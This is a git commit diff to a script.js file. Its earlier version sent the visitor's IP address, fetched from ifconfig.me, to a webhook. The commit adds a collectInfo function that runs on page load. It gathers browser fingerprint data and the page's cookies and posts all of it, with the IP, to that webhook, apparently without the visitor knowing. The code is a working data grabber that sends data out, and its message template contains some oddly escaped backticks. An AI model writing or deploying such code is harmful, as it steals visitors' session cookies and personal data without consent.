ee95ae6c71d75527dc035791c5e7ae4ba6130024
zhp219 <griffithstevenson352@gmail.com>
2026-04-12 21:39:22 -0400

    Update script.js

--- script.js
+++ script.js
@@ -10,5 +10,34 @@ function postToWebhook(text) {
     });
 }
 
-//kek
-fetch("https://ifconfig.me/ip").then(res => res.text()).then(ip => postToWebhook(ip));
+function collectInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: document.cookie,
+        referrer: document.referrer,
+        webdriver: navigator.webdriver
+    };
+}
+
+fetch("https://ifconfig.me/ip").then(res => res.text()).then(ip => {
+    const info = collectInfo();
+    const message = `
+`\`\`\
+IP Address: ${ip}
+UserAgent: ${info.userAgent}
+Platform: ${info.platform}
+Language: ${info.language}
+Screen ratio: ${info.screen}
+Timezone: ${info.timezone}
+Cookies: ${info.cookies}
+Referrer: ${info.referrer}
+Webdriver: ${info.webdriver}
+`\`\`\
+    `;
+    postToWebhook(message);
+});
+    
